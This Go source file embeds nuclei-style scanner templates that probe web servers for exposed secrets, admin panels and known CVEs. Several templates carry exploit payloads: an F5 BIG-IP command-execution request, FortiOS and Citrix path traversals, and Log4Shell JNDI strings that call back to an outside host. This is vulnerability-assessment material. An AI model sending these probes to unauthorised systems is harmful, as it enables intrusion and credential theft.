package nuclei

// BundledTemplates are a curated set of nuclei-compatible templates embedded
// directly in the binary. Each template is the literal YAML source that the
// mini-parser understands.
var BundledTemplates = []string{
	exposedGitConfigTemplate,
	exposedEnvTemplate,
	exposedBackupTemplate,
	exposedAdminerTemplate,
	exposedSwaggerTemplate,
	exposedWordpressLoginTemplate,
	exposedGitHeadTemplate,
	tomcatManagerTemplate,
	apacheStatusTemplate,
	phpInfoTemplate,
	jenkinsScriptConsoleTemplate,
	expressStackTraceTemplate,
	strutsDebugTemplate,
	owaEcpTemplate,
	bigipPathTraversalTemplate,
	fortiosPathTraversalTemplate,
	citrixPathTraversalTemplate,
	log4jBodyTemplate,
	log4jHeaderTemplate,
	exposedDotEnvTemplate,
	exposedAWScredentialsTemplate,
	exposedDockerSocketTemplate,
	defaultIISLoginTemplate,
	wordpressDebugTemplate,
	exposedTraefikDashboardTemplate,
}

const (
	exposedGitConfigTemplate = `id: exposed-git-config
info:
  name: Exposed .git/config
  author: apophis
  severity: high
  description: The .git/config file is web-accessible.
  reference:
    - https://owasp.org/www-community/attacks/Information_exposure_through_directory_listing
  tags: git,exposure
http:
  - method: GET
    path:
      - "{{base}}/.git/config"
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "[core]"
        condition: and
`

	exposedEnvTemplate = `id: exposed-env
info:
  name: Exposed .env file
  author: apophis
  severity: critical
  description: Environment file with secrets is web-accessible.
  tags: env,secrets,exposure
http:
  - method: GET
    path:
      - "{{base}}/.env"
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "DB_PASSWORD="
        condition: and
`

	exposedBackupTemplate = `id: exposed-backup
info:
  name: Exposed database backup
  author: apophis
  severity: high
  description: A database backup file is web-accessible.
  tags: backup,exposure
http:
  - method: GET
    path:
      - "{{base}}/backup.sql"
      - "{{base}}/db.sql"
      - "{{base}}/dump.sql"
      - "{{base}}/database.sql"
      - "{{base}}/backup.tar.gz"
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "CREATE TABLE"
          - "INSERT INTO"
        condition: or
`

	exposedAdminerTemplate = `id: exposed-adminer
info:
  name: Adminer database tool exposed
  author: apophis
  severity: high
  description: Adminer database tool is publicly accessible.
  tags: adminer,database,exposure
http:
  - method: GET
    path:
      - "{{base}}/adminer.php"
      - "{{base}}/adminer/"
    matchers:
      - type: word
        words:
          - "Adminer"
        condition: or
`

	exposedSwaggerTemplate = `id: exposed-swagger
info:
  name: Swagger / OpenAPI UI exposed
  author: apophis
  severity: low
  description: Swagger UI is publicly accessible.
  tags: api,swagger,exposure
http:
  - method: GET
    path:
      - "{{base}}/swagger-ui.html"
      - "{{base}}/swagger/index.html"
      - "{{base}}/api/swagger.json"
      - "{{base}}/openapi.json"
    matchers:
      - type: word
        words:
          - "swagger"
          - "openapi"
        condition: or
        case-insensitive: true
`

	exposedWordpressLoginTemplate = `id: exposed-wordpress-login
info:
  name: WordPress login exposed
  author: apophis
  severity: info
  description: A WordPress login form is publicly accessible.
  tags: wordpress,cms
http:
  - method: GET
    path:
      - "{{base}}/wp-login.php"
    matchers:
      - type: word
        words:
          - "wp-submit"
        condition: or
`

	exposedGitHeadTemplate = `id: exposed-git-head
info:
  name: Exposed .git/HEAD
  author: apophis
  severity: high
  description: The .git directory is web-accessible.
  tags: git,exposure
http:
  - method: GET
    path:
      - "{{base}}/.git/HEAD"
      - "{{base}}/.git/index"
    matchers:
      - type: word
        words:
          - "ref: refs/"
        condition: or
`

	tomcatManagerTemplate = `id: tomcat-manager
info:
  name: Apache Tomcat manager exposed
  author: apophis
  severity: critical
  description: Apache Tomcat manager application is publicly accessible.
  tags: tomcat,exposure
http:
  - method: GET
    path:
      - "{{base}}/manager/html"
      - "{{base}}/host-manager/html"
    matchers:
      - type: word
        words:
          - "Apache Tomcat"
        condition: or
`

	apacheStatusTemplate = `id: apache-status
info:
  name: Apache mod_status exposed
  author: apophis
  severity: medium
  description: Apache mod_status is publicly accessible and reveals URLs, IPs, user-agents.
  tags: apache,exposure
http:
  - method: GET
    path:
      - "{{base}}/server-status"
      - "{{base}}/server-info"
    matchers:
      - type: word
        words:
          - "Apache Server Status"
          - "Apache Server Information"
        condition: or
`

	phpInfoTemplate = `id: php-info
info:
  name: phpinfo() exposed
  author: apophis
  severity: medium
  description: A phpinfo() output is publicly accessible.
  tags: php,exposure
http:
  - method: GET
    path:
      - "{{base}}/phpinfo.php"
      - "{{base}}/info.php"
      - "{{base}}/php_info.php"
    matchers:
      - type: word
        words:
          - "PHP Version"
          - "phpinfo()"
        condition: or
`

	jenkinsScriptConsoleTemplate = `id: jenkins-script-console
info:
  name: Jenkins script console exposed
  author: apophis
  severity: critical
  description: Jenkins script console is publicly accessible — unauthenticated RCE.
  reference:
    - https://www.jenkins.io/security/
  tags: jenkins,rce
http:
  - method: GET
    path:
      - "{{base}}/script"
      - "{{base}}/jenkins/script"
    matchers:
      - type: word
        words:
          - "Jenkins"
          - "Script Console"
        condition: and
`

	expressStackTraceTemplate = `id: express-stack-trace
info:
  name: Node.js / Express stack trace exposed
  author: apophis
  severity: medium
  description: Express error handler returns stack traces.
  tags: nodejs,exposure
http:
  - method: GET
    path:
      - "{{base}}/does-not-exist-apophis-probe"
    matchers:
      - type: word
        words:
          - "at Layer.handle"
          - "node_modules/express"
        condition: or
`

	strutsDebugTemplate = `id: struts-debug
info:
  name: Apache Struts debug mode enabled
  author: apophis
  severity: medium
  description: Struts2 devMode is enabled — internal config exposed.
  tags: struts,exposure
http:
  - method: GET
    path:
      - "{{base}}/"
    matchers:
      - type: word
        words:
          - "struts.devMode"
        condition: or
`

	owaEcpTemplate = `id: owa-ecp
info:
  name: Outlook Web Access / ECP exposed
  author: apophis
  severity: info
  description: Outlook Web Access Exchange Control Panel is publicly accessible.
  tags: exchange,owa
http:
  - method: GET
    path:
      - "{{base}}/owa"
      - "{{base}}/ecp"
    matchers:
      - type: word
        words:
          - "Outlook"
          - "Exchange"
        condition: or
`

	bigipPathTraversalTemplate = `id: bigip-path-traversal
info:
  name: F5 BIG-IP iControl REST path traversal (CVE-2022-1388)
  author: apophis
  severity: critical
  description: BIG-IP iControl REST is vulnerable to path traversal and auth bypass.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2022-1388
  tags: f5,bigip,rce,cve-2022-1388
http:
  - method: GET
    path:
      - "{{base}}/mgmt/tm/util/bash"
    headers:
      - key: X-F5-Auth-Token
        value: apophis-probe
      - key: Content-Type
        value: application/json
    body: '{"command":"run","utilCmdArgs":"-c id"}'
    matchers:
      - type: word
        words:
          - "commandResult"
        condition: or
`

	fortiosPathTraversalTemplate = `id: fortios-path-traversal
info:
  name: Fortinet FortiOS SSL-VPN path traversal (CVE-2018-13379)
  author: apophis
  severity: critical
  description: FortiOS SSL-VPN web portal allows unauthenticated path traversal.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2018-13379
  tags: fortinet,cve-2018-13379
http:
  - method: GET
    path:
      - "{{base}}/remote/fgt_lang?lang=/../../../..//dev/cmdb/sslvpn_websession"
    matchers:
      - type: word
        words:
          - "var fgt_lang"
          - "tunnel-ip"
        condition: or
`

	citrixPathTraversalTemplate = `id: citrix-path-traversal
info:
  name: Citrix ADC path traversal (CVE-2019-19781)
  author: apophis
  severity: critical
  description: Citrix ADC / Gateway allows directory traversal.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2019-19781
  tags: citrix,cve-2019-19781
http:
  - method: GET
    path:
      - "{{base}}/vpn/../vpns/cfg/smb.conf"
      - "{{base}}/vpn/../vpns/portal/scripts/newbm.pl"
    matchers:
      - type: status
        status:
          - 200
`

	log4jBodyTemplate = `id: log4j-body
info:
  name: Log4Shell (CVE-2021-44228) — body parameter
  author: apophis
  severity: critical
  description: The application logs request bodies with attacker-controlled JNDI lookup.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2021-44228
  tags: log4j,cve-2021-44228,rce
http:
  - method: POST
    path:
      - "{{base}}/"
    headers:
      - key: Content-Type
        value: application/x-www-form-urlencoded
    body: "q=${jndi:ldap://${interactsh-url}/a}"
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "JNDI Lookup"
        condition: or
`

	log4jHeaderTemplate = `id: log4j-header
info:
  name: Log4Shell (CVE-2021-44228) — header
  author: apophis
  severity: critical
  description: The application logs request headers with attacker-controlled JNDI lookup.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2021-44228
  tags: log4j,cve-2021-44228,rce
http:
  - method: GET
    path:
      - "{{base}}/"
    headers:
      - key: X-Api-Version
        value: '${jndi:ldap://${interactsh-url}/h}'
      - key: User-Agent
        value: '${jndi:ldap://${interactsh-url}/u}'
    matchers:
      - type: word
        words:
          - "JNDI Lookup"
        condition: or
`

	exposedDotEnvTemplate = `id: exposed-dotenv
info:
  name: Exposed .env.production / .env.local
  author: apophis
  severity: critical
  description: A production .env file is web-accessible.
  tags: env,secrets,exposure
http:
  - method: GET
    path:
      - "{{base}}/.env.production"
      - "{{base}}/.env.local"
      - "{{base}}/.env.development"
    matchers:
      - type: word
        words:
          - "SECRET_KEY_BASE"
          - "AWS_SECRET"
          - "DB_PASSWORD"
        condition: or
`

	exposedAWScredentialsTemplate = `id: exposed-aws-credentials
info:
  name: Exposed .aws/credentials
  author: apophis
  severity: critical
  description: AWS credentials file is web-accessible.
  tags: aws,secrets,exposure
http:
  - method: GET
    path:
      - "{{base}}/.aws/credentials"
    matchers:
      - type: word
        words:
          - "aws_access_key_id"
        condition: or
`

	exposedDockerSocketTemplate = `id: exposed-docker-socket
info:
  name: Exposed Docker API
  author: apophis
  severity: critical
  description: The Docker engine API is publicly accessible.
  tags: docker,exposure,rce
http:
  - method: GET
    path:
      - "{{base}}/version"
      - "{{base}}/containers/json"
    matchers:
      - type: word
        words:
          - "ApiVersion"
          - "Docker"
        condition: or
`

	defaultIISLoginTemplate = `id: iis-default-login
info:
  name: Default IIS Windows authentication prompt
  author: apophis
  severity: info
  description: IIS returns a 401 with NTLM / Negotiate challenge on the root.
  tags: iis,auth
http:
  - method: GET
    path:
      - "{{base}}/"
    matchers:
      - type: status
        status:
          - 401
      - type: word
        words:
          - "WWW-Authenticate"
        condition: and
`

	wordpressDebugTemplate = `id: wordpress-debug
info:
  name: WordPress debug.log exposed
  author: apophis
  severity: medium
  description: WordPress debug.log is publicly accessible.
  tags: wordpress,exposure
http:
  - method: GET
    path:
      - "{{base}}/wp-content/debug.log"
    matchers:
      - type: word
        words:
          - "PHP Warning"
          - "PHP Fatal error"
          - "Stack trace"
        condition: or
`

	exposedTraefikDashboardTemplate = `id: traefik-dashboard
info:
  name: Traefik dashboard exposed
  author: apophis
  severity: medium
  description: Traefik dashboard is publicly accessible.
  tags: traefik,exposure
http:
  - method: GET
    path:
      - "{{base}}/dashboard"
      - "{{base}}/api"
    matchers:
      - type: word
        words:
          - "traefik"
        condition: or
        case-insensitive: true
`
)
